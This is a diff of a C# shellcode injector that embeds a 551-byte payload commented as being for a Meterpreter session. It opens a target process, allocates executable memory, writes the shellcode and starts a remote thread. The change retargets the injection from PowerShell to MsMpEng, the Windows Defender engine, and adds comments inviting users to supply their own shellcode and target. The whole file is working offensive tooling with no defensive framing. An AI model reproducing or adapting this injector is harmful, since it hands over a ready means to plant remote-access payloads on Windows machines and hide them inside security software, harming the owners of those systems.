@@ -21,6 +21,7 @@ class Program
 
     public static void Main()
     {
+        //this shellcode is for meterpreter session you can add yours
         byte[] shellcode = new byte[551] {0x48,0x31,0xc9,0x48,0x81,0xe9,
 0xc0,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,0xff,0xff,0x48,
 0xbb,0xe2,0x50,0x93,0x98,0xb6,0xc6,0x1d,0xbc,0x48,0x31,0x58,
@@ -69,13 +70,12 @@ class Program
 0x43,0x05,0x08,0xf9,0x98,0xef,0x8f,0xda,0x7e,0x12,0xe5,0x31,
 0xce,0x49,0x13,0x1d,0xbc};
 
-        Process[] processes = Process.GetProcessesByName("powershell");
+        Process[] processes = Process.GetProcessesByName("MsMpEng"); //set any process you want
         if (processes.Length == 0)
         {
             Console.WriteLine("Target process not found.");
             return;
         }
-
         Process targetProcess = processes[0];
         IntPtr hProcess = OpenProcess(0x1F0FFF, 0, targetProcess.Id);
         if (hProcess == IntPtr.Zero)
@@ -83,7 +83,6 @@ class Program
             Console.WriteLine("Failed to open the target process.");
             return;
         }
-
         IntPtr remoteMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x1000, 0x40);
         if (remoteMemory == IntPtr.Zero)
         {
@@ -91,7 +90,6 @@ class Program
             CloseHandle(hProcess);
             return;
         }
-
         int bytesWritten;
         if (WriteProcessMemory(hProcess, remoteMemory, shellcode, (uint)shellcode.Length, out bytesWritten) == 0)
         {
@@ -99,7 +97,6 @@ class Program
             CloseHandle(hProcess);
             return;
         }
-
         IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteMemory, IntPtr.Zero, 0, IntPtr.Zero);
         if (hThread == IntPtr.Zero)
         {
@@ -107,7 +104,6 @@ class Program
             CloseHandle(hProcess);
             return;
         }
-
         Console.WriteLine("Shellcode injected successfully.");
         CloseHandle(hProcess);
     }
